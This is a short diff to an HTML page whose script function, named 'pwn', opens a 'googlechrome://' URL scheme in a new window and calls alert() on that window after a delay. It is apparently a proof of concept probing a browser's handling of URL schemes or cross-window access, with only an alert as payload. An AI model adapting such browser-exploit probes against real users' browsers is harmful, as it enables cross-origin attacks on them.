@@ -1,7 +1,7 @@
 <html>
 	<script>
 	    pwn = () => {
-		var x = document.location='googlechrome://google.com:1234';
+		var x = window.open('googlechrome://google.com:1234');
 		    setTimeout(function(){x.alert()}, 3000)
 	        
 	    }
